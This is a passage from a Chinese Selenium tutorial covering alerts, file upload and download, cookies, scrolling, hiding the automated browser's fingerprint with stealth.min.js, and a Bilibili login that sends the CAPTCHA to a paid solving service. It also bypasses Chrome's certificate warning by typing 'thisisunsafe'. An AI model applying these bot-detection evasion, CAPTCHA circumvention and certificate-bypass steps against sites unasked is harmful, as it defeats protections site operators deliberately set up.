webdriver.Firefox()driver.get(<span class="hljs-string">&#x27;file:///&#x27;</span> + <span class="hljs-built_in">str</span>(Path(Path.cwd(), <span class="hljs-string">&#x27;弹窗.html&#x27;</span>)))sleep(<span class="hljs-number">2</span>)<span class="hljs-comment"># 点击alert按钮</span>driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;alert&quot;]&#x27;</span>).click()sleep(<span class="hljs-number">1</span>)alert = driver.switch_to.alert<span class="hljs-comment"># 打印alert弹窗的文本</span><span class="hljs-built_in">print</span>(alert.text)<span class="hljs-comment"># 确认</span>alert.accept()sleep(<span class="hljs-number">2</span>)<span class="hljs-comment"># 点击confirm按钮</span>driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;confirm&quot;]&#x27;</span>).click()sleep(<span class="hljs-number">1</span>)confirm = driver.switch_to.alert<span class="hljs-built_in">print</span>(confirm.text)<span class="hljs-comment"># 取消</span>confirm.dismiss()sleep(<span class="hljs-number">2</span>)<span class="hljs-comment"># 点击confirm按钮</span>driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;prompt&quot;]&#x27;</span>).click()sleep(<span class="hljs-number">1</span>)prompt = driver.switch_to.alert<span class="hljs-built_in">print</span>(prompt.text)<span class="hljs-comment"># 向prompt的输入框中传入文本</span>prompt.send_keys(<span class="hljs-string">&quot;Dream丶Killer&quot;</span>)sleep(<span class="hljs-number">2</span>)prompt.accept()<span class="hljs-string">&#x27;&#x27;&#x27;输出</span><span class="hljs-string">alert hello</span><span class="hljs-string">confirm hello</span><span class="hljs-string">prompt hello</span><span class="hljs-string">&#x27;&#x27;&#x27;</span></code></pre></div><hr><h2 id="上传-下载文件"><a href="#上传-下载文件" class="headerlink" title="上传 &amp; 下载文件"></a><font color="orange">上传 &amp; 下载文件</font></h2><h3 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h3><p>常见的 web 页面的上传，一般使用 <code>input</code> 标签或是插件（<code>JavaScript</code>、<code>Ajax</code>），对于 <code>input</code> 标签的上传，可以直接使用 <code>send_keys(路径)</code> 来进行上传。<br/> 先写一个测试用的页面。</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Document<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/e269df8ea646439a867b3b911f6657b7.png"><br/> 下面通过 <code>xpath</code> 定位 <code>input</code> 标签，然后使用 <code>send_keys(str(file_path)</code> 上传文件。</p><div class="code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver<span class="hljs-keyword">from</span> pathlib <span class="hljs-keyword">import</span> <span class="hljs-type">Path</span><span class="hljs-keyword">from</span> <span class="hljs-type">time</span> <span class="hljs-keyword">import</span> sleepdriver = webdriver.Chrome()file_path = Path(<span class="hljs-type">Path</span>.cwd(), <span class="hljs-string">&#x27;上传下载.html&#x27;</span>)driver.<span class="hljs-keyword">get</span>(<span class="hljs-string">&#x27;file:///&#x27;</span> + str(file_path))driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@name=&quot;upload&quot;]&#x27;</span>).send_keys(str(file_path))</code></pre></div><h3 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h3><h4 id="Chrome浏览器"><a href="#Chrome浏览器" class="headerlink" title="Chrome浏览器"></a>Chrome浏览器</h4><p><code>Firefox</code> 浏览器要想实现文件下载，需要通过 <code>add_experimental_option</code> 添加 <code>prefs</code> 参数。</p><p>下面测试下载搜狗图片。指定保存路径为代码所在路径。<br/> <img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/5c2afb93333e4c2bac7b2bcb8e44743a.png"></p><div class="code-wrapper"><pre><code class="hljs stylus">from selenium import webdriver prefs = &#123;<span class="hljs-string">&#x27;profile.default_content_settings.popups&#x27;</span>: <span class="hljs-number">0</span>,         <span class="hljs-string">&#x27;download.default_directory&#x27;</span>: <span class="hljs-built_in">str</span>(Path<span class="hljs-selector-class">.cwd</span>())&#125;<span class="hljs-selector-tag">option</span> = webdriver<span class="hljs-selector-class">.ChromeOptions</span>() <span class="hljs-selector-tag">option</span><span class="hljs-selector-class">.add_experimental_option</span>(<span class="hljs-string">&#x27;prefs&#x27;</span>, prefs)driver = webdriver<span class="hljs-selector-class">.Chrome</span>(options=option)driver<span class="hljs-selector-class">.get</span>(<span class="hljs-string">&quot;https://pic.sogou.com/d?query=%E7%83%9F%E8%8A%B1&amp;amp;did=4&amp;amp;category_from=copyright&quot;</span>)driver<span class="hljs-selector-class">.find_element_by_xpath</span>(<span class="hljs-string">&#x27;/html/body/div/div/div/div[2]/div[1]/div[2]/div[1]/div[2]/a&#x27;</span>)<span class="hljs-selector-class">.click</span>()driver<span class="hljs-selector-class">.switch_to</span><span class="hljs-selector-class">.window</span>(driver<span class="hljs-selector-class">.window_handles</span><span class="hljs-selector-attr">[-1]</span>)driver<span class="hljs-selector-class">.find_element_by_xpath</span>(<span class="hljs-string">&#x27;./html&#x27;</span>)<span class="hljs-selector-class">.send_keys</span>(<span class="hljs-string">&#x27;thisisunsafe&#x27;</span>)</code></pre></div><blockquote><p><font color="#3333CC">代码最后两句猜测有理解什么意思的吗~，哈哈，实际作用是当你弹出像下面的页面 “您的连接不是私密连接” 时，可以直接键盘输入 “thisisunsafe” 直接访问链接。那么这个键盘输入字符串的操作就是之间讲到的 <code>send_keys</code>，但由于该标签页是新打开的，所以要通过 <code>switch_to.window()</code> 将窗口切换到最新的标签页。</font></p></blockquote><h4 id="Firefox浏览器"><a href="#Firefox浏览器" class="headerlink" title="Firefox浏览器"></a>Firefox浏览器</h4><p><code>Firefox</code> 浏览器要想实现文件下载，需要通过 <code>set_preference</code> 设置 <code>FirefoxProfile（）</code> 的一些属性。</p><div class="code-wrapper"><pre><code class="hljs stylus">from selenium import webdriverimport osfp = webdriver<span class="hljs-selector-class">.FirefoxProfile</span>()fp<span class="hljs-selector-class">.set_preference</span>(<span class="hljs-string">&quot;browser.download.dir&quot;</span>,os<span class="hljs-selector-class">.getcwd</span>())fp<span class="hljs-selector-class">.set_preference</span>(<span class="hljs-string">&quot;browser.download.folderList&quot;</span>,<span class="hljs-number">2</span>)fp<span class="hljs-selector-class">.set_preference</span>(<span class="hljs-string">&quot;browser.download.manager.showhenStarting&quot;</span>,True)fp<span class="hljs-selector-class">.set_preference</span>(<span class="hljs-string">&quot;browser.helperApps.neverAsk.saveToDisk&quot;</span>,<span class="hljs-string">&quot;application/octet-stream&quot;</span>)driver = webdriver<span class="hljs-selector-class">.Firefox</span>(firefox_profile = fp)driver<span class="hljs-selector-class">.get</span>(<span class="hljs-string">&quot;https://pic.sogou.com/d?query=%E7%83%9F%E8%8A%B1&amp;amp;did=4&amp;amp;category_from=copyright&quot;</span>)driver<span class="hljs-selector-class">.find_element_by_xpath</span>(<span class="hljs-string">&#x27;/html/body/div/div/div/div[2]/div[1]/div[2]/div[1]/div[2]/a&#x27;</span>)<span class="hljs-selector-class">.click</span>()</code></pre></div><p>运行效果与 <code>Chrome</code> 基本一致，这里就不再展示了。</p><hr><h2 id="Cookies操作"><a href="#Cookies操作" class="headerlink" title="Cookies操作"></a><font color="orange">Cookies操作</font></h2><p><code>cookies</code> 是识别用户登录与否的关键，爬虫中常常使用 <code>selenium + requests</code> 实现 <code>cookie</code>持久化，即先用 <code>selenium</code> 模拟登陆获取 <code>cookie</code> ，再通过 <code>requests</code> 携带 <code>cookie</code> 进行请求。</p><p><code>webdriver</code> 提供 <code>cookies</code> 的几种操作：读取、添加删除。</p><p>下面看一下简单的示例，演示了它们的用法。</p><div class="code-wrapper"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> selenium import webdriver driver = webdriver.Chrome()driver.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;https://blog.csdn.net/&quot;</span>)<span class="hljs-comment"># 输出所有cookie信息</span><span class="hljs-built_in">print</span>(driver.get_cookies())cookie_dict = &#123;    <span class="hljs-string">&#x27;domain&#x27;</span>: <span class="hljs-string">&#x27;.csdn.net&#x27;</span>,     <span class="hljs-string">&#x27;expiry&#x27;</span>: 1664765502,     <span class="hljs-string">&#x27;httpOnly&#x27;</span>: <span class="hljs-literal">False</span>,     <span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;test&#x27;</span>,     <span class="hljs-string">&#x27;path&#x27;</span>: <span class="hljs-string">&#x27;/&#x27;</span>,     <span class="hljs-string">&#x27;secure&#x27;</span>: <span class="hljs-literal">True</span>,     <span class="hljs-string">&#x27;value&#x27;</span>: <span class="hljs-string">&#x27;null&#x27;</span>&#125;<span class="hljs-comment"># 添加cookie</span>driver.add_cookie(cookie_dict)<span class="hljs-comment"># 显示 name = &#x27;test&#x27; 的cookie信息</span><span class="hljs-built_in">print</span>(driver.get_cookie(<span class="hljs-string">&#x27;test&#x27;</span>))<span class="hljs-comment"># 删除 name = &#x27;test&#x27; 的cookie信息</span>driver.delete_cookie(<span class="hljs-string">&#x27;test&#x27;</span>)<span class="hljs-comment"># 删除当前会话中的所有cookie</span>driver.delete_all_cookies()</code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/bfc879ed759a41ed8fe86a6444976972.png"></p><hr><h2 id="调用JavaScript"><a href="#调用JavaScript" class="headerlink" title="调用JavaScript"></a><font color="orange">调用JavaScript</font></h2><p><code>webdriver</code> 对于滚动条的处理需要用到 <code>JavaScript</code> ，同时也可以向 <code>textarea</code> 文本框中输入文本（ <code>webdriver</code> 只能定位，不能输入文本），<code>webdriver</code> 中使用execute_script方法实现 <code>JavaScript</code> 的执行。</p><h3 id="滑动滚动条"><a href="#滑动滚动条" class="headerlink" title="滑动滚动条"></a>滑动滚动条</h3><h4 id="通过-x-y-坐标滑动"><a href="#通过-x-y-坐标滑动" class="headerlink" title="通过 x ,y 坐标滑动"></a>通过 x ,y 坐标滑动</h4><p>对于这种通过坐标滑动的方法，我们需要知道做表的起始位置在页面左上角（0,0），下面看一下示例，滑动 CSDN 首页。</p><div class="code-wrapper"><pre><code class="hljs stylus">from selenium import webdriver from <span class="hljs-selector-tag">time</span> import sleepdriver = webdriver<span class="hljs-selector-class">.Chrome</span>()driver<span class="hljs-selector-class">.get</span>(<span class="hljs-string">&quot;https://blog.csdn.net/&quot;</span>)<span class="hljs-function"><span class="hljs-title">sleep</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span>js = <span class="hljs-string">&quot;window.scrollTo(0,500);&quot;</span>driver<span class="hljs-selector-class">.execute_script</span>(js)</code></pre></div><h3 id="通过参照标签滑动"><a href="#通过参照标签滑动" class="headerlink" title="通过参照标签滑动"></a>通过参照标签滑动</h3><p>这种方式需要先找一个参照标签，然后将滚动条滑动至该标签的位置。下面还是用 CSDN 首页做示例，我们用循环来实现重复滑动。该 <code>li</code> 标签实际是一种<strong>懒加载</strong>，当用户滑动至最后标签时，才会加载后面的数据。</p><div class="code-wrapper"><pre><code class="hljs stylus">from selenium import webdriver from <span class="hljs-selector-tag">time</span> import sleepdriver = webdriver<span class="hljs-selector-class">.Chrome</span>()driver<span class="hljs-selector-class">.get</span>(<span class="hljs-string">&quot;https://blog.csdn.net/&quot;</span>)<span class="hljs-function"><span class="hljs-title">sleep</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span>driver<span class="hljs-selector-class">.implicitly_wait</span>(<span class="hljs-number">3</span>)<span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">31</span>, <span class="hljs-number">102</span>, <span class="hljs-number">10</span>):    <span class="hljs-built_in">sleep</span>(<span class="hljs-number">1</span>)    target = driver<span class="hljs-selector-class">.find_element_by_xpath</span>(f<span class="hljs-string">&#x27;//*[@id=&quot;feedlist_id&quot;]/li[&#123;i&#125;]&#x27;</span>)    driver<span class="hljs-selector-class">.execute_script</span>(<span class="hljs-string">&quot;arguments[0].scrollIntoView();&quot;</span>, target)</code></pre></div><hr><h2 id="其他操作"><a href="#其他操作" class="headerlink" title="其他操作"></a><font color="orange">其他操作</font></h2><h3 id="关闭所有页面"><a href="#关闭所有页面" class="headerlink" title="关闭所有页面"></a>关闭所有页面</h3><p>使用 <code>quit()</code> 方法可以关闭所有窗口并退出驱动程序。</p><div class="code-wrapper"><pre><code class="hljs cos">driver.<span class="hljs-keyword">quit</span>()</code></pre></div><h3 id="关闭当前页面"><a href="#关闭当前页面" class="headerlink" title="关闭当前页面"></a>关闭当前页面</h3><p>使用 <code>close()</code> 方法可以关闭当前页面，<font color="#3333CC">使用时要注意 “当前页面” 这四个字，当你关闭新打开的页面时，需要切换窗口才能操作新窗口并将它关闭。</font>，下面看一个简单的例子，这里不切换窗口，看一下是否能够关闭新打开的页面。</p><div class="code-wrapper"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">from</span> selenium import webdriver<span class="hljs-built_in">from</span> <span class="hljs-built_in">time</span> import sleepdriver = webdriver.Chrome()driver.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;https://blog.csdn.net/&#x27;</span>)driver.implicitly_wait(<span class="hljs-number">3</span>)<span class="hljs-comment"># 点击进入新页面</span>driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;mainContent&quot;]/aside/div[1]/div&#x27;</span>).click()<span class="hljs-comment"># 切换窗口</span><span class="hljs-comment"># driver.switch_to.window(driver.window_handles[-1])</span>sleep(<span class="hljs-number">3</span>)driver.<span class="hljs-built_in">close</span>()</code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/069b86082e14416c987e5c0de9138469.gif"><br/> 可以看到，在不切换窗口时，<code>driver</code> 对象还是操作最开始的页面。</p><h3 id="对当前页面进行截图"><a href="#对当前页面进行截图" class="headerlink" title="对当前页面进行截图"></a>对当前页面进行截图</h3><p><code>wendriver</code> 中使用 <code>get_screenshot_as_file()</code> 对 “当前页面” 进行截图，这里和上面的 <code>close()</code> 方法一样，对于新窗口的操作，一定要切换窗口，不然截的还是原页面的图。对页面截图这一功能，主要用在我们测试时记录报错页面的，我们可以将 <code>try except</code> 结合 <code>get_screenshot_as_file()</code> 一起使用来实现这一效果。</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:    driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;mainContent&quot;]/aside/div[1]/div&#x27;</span>).click()<span class="hljs-keyword">except</span>:    driver.get_screenshot_as_file(<span class="hljs-string">r&#x27;C:\Users\pc\Desktop\screenshot.png&#x27;</span>)</code></pre></div><hr><h2 id="Selenium进阶"><a href="#Selenium进阶" class="headerlink" title="Selenium进阶"></a><font color="orange">Selenium进阶</font></h2><h3 id="selenium隐藏指纹特征"><a href="#selenium隐藏指纹特征" class="headerlink" title="selenium隐藏指纹特征"></a>selenium隐藏指纹特征</h3><p><code>selenium</code> 对于部分网站来说十分强大，但它也不是万能的，实际上，<code>selenium</code> 启动的浏览器，有几十个特征可以被网站检测到，轻松的识别出你是爬虫。<br/> 不相信？接着往下看，首先你手动打开浏览器输入<a href="https://bot.sannysoft.com/">https://bot.sannysoft.com/</a>，在网络无异常的情况下，显示应该如下：<br/> <img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/ba9f948841734b36ba87faeefdd1b8e5.png"><br/> 下面通过 <code>selenium</code> 来打开浏览器。</p><div class="code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriverdriver = webdriver.Chrome()driver.<span class="hljs-keyword">get</span>(<span class="hljs-string">&#x27;https://bot.sannysoft.com/&#x27;</span>)</code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/987601f97acc4979875c8212e97a4856.png"><br/> 通过 <code>webdriver:present</code> 可以看到浏览器已经识别出了你是爬虫，我们再试一下无头浏览器。</p><div class="code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver# 设置无头浏览器<span class="hljs-keyword">option</span> = webdriver.ChromeOptions()<span class="hljs-keyword">option</span>.add_argument(<span class="hljs-string">&#x27;--headless&#x27;</span>)driver = webdriver.Chrome()driver.<span class="hljs-keyword">get</span>(<span class="hljs-string">&#x27;https://bot.sannysoft.com/&#x27;</span>)# 对当前页面进行截图driver.save_screenshot(<span class="hljs-string">&#x27;page.png&#x27;</span>)</code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/be92d71a27954c82824e36ae366b590b.png"><br/> 没错，就是这么真实，对于常规网站可能没什么反爬，但真正想要抓你还是一抓一个准的。</p><p>说了这么多，是不是 <code>selenium</code> 真的不行？别着急，实际还是解决方法的。关键点在于如何在浏览器检测之前将这些特征进行隐藏，事实上，前人已经为我们铺好了路，解决这个问题的关键，实际就是一个 <code>stealth.min.js</code> 文件，这个文件是给 <code>puppeteer</code> 用的，在 <code>Python</code> 中使用的话需要单独执行这个文件，该文件获取方式需要安装 <code>node.js</code> ，如果已安装的读者可以直接运行如下命令即可在当前目录生成该文件。</p><div class="code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">npx extract-stealth-evasions</span></code></pre></div><p>这里我已经成功获取了 <code>stealth.min.js</code> 文件。<br/> 链接：<a href="https://pan.baidu.com/s/1O6co1Exa8eks6QmKAst91g">https://pan.baidu.com/s/1O6co1Exa8eks6QmKAst91g</a><br/> <strong>提取码：关注文末小卡片回复“隐藏指纹特征”获取</strong></p><p>下面我们在网站检测之前先执行该js文件隐藏特征，同样使用无头浏览器，看是否有效。</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<span class="hljs-keyword">from</span> selenium.webdriver <span class="hljs-keyword">import</span> Chromeoption = webdriver.ChromeOptions()option.add_argument(<span class="hljs-string">&quot;--headless&quot;</span>)<span class="hljs-comment"># 无头浏览器需要添加user-agent来隐藏特征</span>option.add_argument(<span class="hljs-string">&#x27;user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36&#x27;</span>)driver = Chrome(options=option)driver.implicitly_wait(<span class="hljs-number">5</span>)<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;stealth.min.js&#x27;</span>) <span class="hljs-keyword">as</span> f:    js = f.read()driver.execute_cdp_cmd(<span class="hljs-string">&quot;Page.addScriptToEvaluateOnNewDocument&quot;</span>, &#123;  <span class="hljs-string">&quot;source&quot;</span>: js&#125;)driver.get(<span class="hljs-string">&#x27;https://bot.sannysoft.com/&#x27;</span>)driver.save_screenshot(<span class="hljs-string">&#x27;hidden_features.png&#x27;</span>)</code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/75ce4a09ee6e4f618b4da8bc0939bc43.png"><br/> 通过 <code>stealth.min.js</code> 的隐藏，可以看到这次使用无头浏览器特征基本都以隐藏，已经十分接近人工打开浏览器了。</p><hr><h2 id="实战：selenium模拟登录B站"><a href="#实战：selenium模拟登录B站" class="headerlink" title="实战：selenium模拟登录B站"></a><font color="orange">实战：selenium模拟登录B站</font></h2><h3 id="登录验证码处理"><a href="#登录验证码处理" class="headerlink" title="登录验证码处理"></a>登录验证码处理</h3><p><code>selenium</code> 中的难点验证码破解在上文中并没有提及，因为确实没有很好的方式，一般都需要通过第三方平台实现破解，本案例中使用的是<a href="http://www.chaojiying.com/">超级鹰</a>平台(收费，大概1元30次，测试用冲个1元就足够)。下面实战开始！</p><h3 id="分析登录界面结构"><a href="#分析登录界面结构" class="headerlink" title="分析登录界面结构"></a>分析登录界面结构</h3><p>B站登录界面如下。<br/> <img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/08082bdd86d24c56b27fa9d6657f1952.png"></p><p>首先明确我们的目标，打开登陆界面，定位用户名和密码对应的标签，输入相关数据后，点击登录，此时页面会弹出文字验证码。<br/> <img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/4ad25a74f5be4ba784d9f07e1cf11826.png"></p><p>下文会用两种方法进行验证码图片的获取，并提交给超级鹰进行识别，接收到汉字的坐标后，处理坐标数据，然后用动作链点击对应坐标操作，完成登录。</p><p>下面使用 <code>selenium</code> 打开登录页面。</p><div class="code-wrapper"><pre><code class="hljs routeros">driver.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;https://passport.bilibili.com/login&#x27;</span>)<span class="hljs-comment"># 定位用户名，密码输入框</span>username = driver.find_element_by_id(<span class="hljs-string">&#x27;login-username&#x27;</span>)password = driver.find_element_by_id(<span class="hljs-string">&#x27;login-passwd&#x27;</span>)<span class="hljs-comment"># 将自己的用户名密码替换xxxxxx</span>username.send_keys(<span class="hljs-string">&#x27;xxxxxx&#x27;</span>)password.send_keys(<span class="hljs-string">&#x27;xxxxxx&#x27;</span>)<span class="hljs-comment"># 定位登录按钮并点击</span>driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;geetest-wrap&quot;]/div/div[5]/a[1]&#x27;</span>).click()</code></pre></div><h3 id="获取页面当前验证码图片"><a href="#获取页面当前验证码图片" class="headerlink" title="获取页面当前验证码图片"></a>获取页面当前验证码图片</h3><h4 id="方法一、页面截图，将验证码区域进行裁剪保存"><a href="#方法一、页面截图，将验证码区域进行裁剪保存" class="headerlink" title="方法一、页面截图，将验证码区域进行裁剪保存"></a>方法一、页面截图，将验证码区域进行裁剪保存</h4><p>使用此方法时，注意我们截取验证码图片时需要<strong>截取完整</strong>，不要只截图片部分，上面文字也需要。完整验证码截图如下：</p><p>首先将点击登录后的页面进行<strong>截图</strong>，然后<strong>定位</strong>到验证码的位置，通过<strong>location()<strong>方法获取验证码左上角的坐标，</strong> size()</strong> 获取验证码的宽和高，左上角坐标加上宽和高就是验证码右下角的坐标。获取坐标后就可以用**crop()**方法来进行裁剪，然后将裁剪到的验证码图片保存。</p><p>此时虽然获取了验证码图片，但是还不能直接提交给超级鹰。<br/> 因为超级鹰识别的验证码图片的<strong>宽和高有限制</strong>，最好不超过 <code>460px,310px</code>。<br/> 但是截取到的验证码图片宽高为 <code>338px，432px</code>，这时就要先将图片缩小一倍再提交即可，等到收到坐标数据再将<strong>坐标乘2</strong>。</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">save_img</span>():    <span class="hljs-comment"># 对当前页面进行截图保存</span>    driver.save_screenshot(<span class="hljs-string">&#x27;page.png&#x27;</span>)    <span class="hljs-comment"># 定位验证码图片的位置</span>    code_img_ele = driver.find_element_by_xpath(<span class="hljs-string">&#x27;/html/body/div[2]/div[2]/div[6]/div/div&#x27;</span>)    <span class="hljs-comment"># 获取验证码左上角的坐标x,y</span>    location = code_img_ele.location    <span class="hljs-comment"># 获取验证码图片对应的长和宽</span>    size = code_img_ele.size    <span class="hljs-comment"># 左上角和右下角的坐标</span>    rangle = (        <span class="hljs-built_in">int</span>(location[<span class="hljs-string">&#x27;x&#x27;</span>] * <span class="hljs-number">1.25</span>), <span class="hljs-built_in">int</span>(location[<span class="hljs-string">&#x27;y&#x27;</span>] * <span class="hljs-number">1.25</span>), <span class="hljs-built_in">int</span>((location[<span class="hljs-string">&#x27;x&#x27;</span>] + size[<span class="hljs-string">&#x27;width&#x27;</span>]) * <span class="hljs-number">1.25</span>),        <span class="hljs-built_in">int</span>((location[<span class="hljs-string">&#x27;y&#x27;</span>] + size[<span class="hljs-string">&#x27;height&#x27;</span>]) * <span class="hljs-number">1.25</span>)    )    i = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./page.png&#x27;</span>)    code_img_name = <span class="hljs-string">&#x27;./code.png&#x27;</span>    <span class="hljs-comment"># crop根据rangle元组内的坐标进行裁剪</span>    frame = i.crop(rangle)    frame.save(code_img_name)    <span class="hljs-keyword">return</span> code_img_ele<span class="hljs-keyword">def</span> <span class="hljs-title function_">narrow_img</span>():    <span class="hljs-comment"># 缩小图片</span>    code = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./code.png&#x27;</span>)    small_img = code.resize((<span class="hljs-number">169</span>, <span class="hljs-number">216</span>))    small_img.save(<span class="hljs-string">&#x27;./small_img.png&#x27;</span>)    <span class="hljs-built_in">print</span>(code.size, small_img.size)</code></pre></div><h4 id="方法二、通过网页获取图片地址，并保存"><a href="#方法二、通过网页获取图片地址，并保存" class="headerlink" title="方法二、通过网页获取图片地址，并保存"></a>方法二、通过网页获取图片地址，并保存</h4><p>这种方法比上一种更加方便，分析网页源码获取图片地址，对该地址发送请求，接收返回的二进制文件，进行保存。首先打开网页源码找到图片地址。</p><p>图片地址是 <code>img</code> 标签的 <code>src</code> 属性值，通过 <code>xpath</code> 得到地址，直接对此 <code>url</code> 发送请求，接收数据并保存即可。<br/> 注意：由于获取的图片的高度仍然大于超级鹰标准格式，所以也需要将图片缩小。</p><div class="code-wrapper"><pre><code class="hljs routeros"><span class="hljs-comment"># 获取img标签的src属性值</span>img_url = driver.find_element_by_xpath(<span class="hljs-string">&#x27;/html/body/div[2]/div[2]/div[6]/div/div/div[2]/div[1]/div/div[2]/img&#x27;</span>).get_attribute(<span class="hljs-string">&#x27;src&#x27;</span>)headers = &#123;    <span class="hljs-string">&#x27;Users-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36&#x27;</span>&#125;<span class="hljs-comment"># 获取图片二进制数据</span>img_data = requests.<span class="hljs-built_in">get</span>(<span class="hljs-attribute">url</span>=img_url, <span class="hljs-attribute">headers</span>=headers).contentwith open(<span class="hljs-string">&#x27;./node1.png&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>)as fp:    fp.write(img_data)i = Image.open(<span class="hljs-string">&#x27;./node1.png&#x27;</span>)<span class="hljs-comment"># 将图片缩小并保存，设置宽为172，高为192</span>small_img = i.resize((172, 192))small_img.save(<span class="hljs-string">&#x27;./small_img1.png&#x27;</span>)</code></pre></div><h3 id="使用超级鹰识别验证码"><a href="#使用超级鹰识别验证码" class="headerlink" title="使用超级鹰识别验证码"></a>使用超级鹰识别验证码</h3><p>这部分没什么说的，直接调用就行。</p><div class="code-wrapper"><pre><code class="hljs livecodeserver"><span class="hljs-comment"># 将验证码提交给超级鹰进行识别</span>chaojiying = Chaojiying_Client(<span class="hljs-string">&#x27;用户名&#x27;</span>, <span class="hljs-string">&#x27;密码&#x27;</span>, <span class="hljs-string">&#x27;96001&#x27;</span>)  <span class="hljs-comment"># 用户中心&amp;gt;&amp;gt;软件ID 生成一个替换 96001</span>im = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;small_img.png&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).<span class="hljs-built_in">read</span>()  <span class="hljs-comment"># 本地图片文件路径 来替换 a.jpg 有时WIN系统须要//</span><span class="hljs-comment"># 9004是验证码类型</span>print(chaojiying.PostPic(im, <span class="hljs-number">9004</span>)[<span class="hljs-string">&#x27;pic_str&#x27;</span>])<span class="hljs-built_in">result</span> = chaojiying.PostPic(im, <span class="hljs-number">9004</span>)[<span class="hljs-string">&#x27;pic_str&#x27;</span>]</code></pre></div><h3 id="提取坐标数据，动作链点击"><a href="#提取坐标数据，动作链点击" class="headerlink" title="提取坐标数据，动作链点击"></a>提取坐标数据，动作链点击</h3><p>超级鹰识别返回的数据格式是：<code>123,12 | 234,21</code> 。我们可以将数据以 <code>&#39; | &#39;</code> 进行分割，保存到列表中，再以逗号分割将 <code>x，y</code> 的坐标保存，得到 <code>[ [123，12]，[234，21] ]</code> 这一格式，然后遍历这一列表，使用动作链对每一个列表元素对应的 <code>x,y</code> 指定的位置进行点击操作，最后定位并点击确认，登录成功。</p><div class="code-wrapper"><pre><code class="hljs vim">all_list = []  # 要存储即将被点击的点的坐标  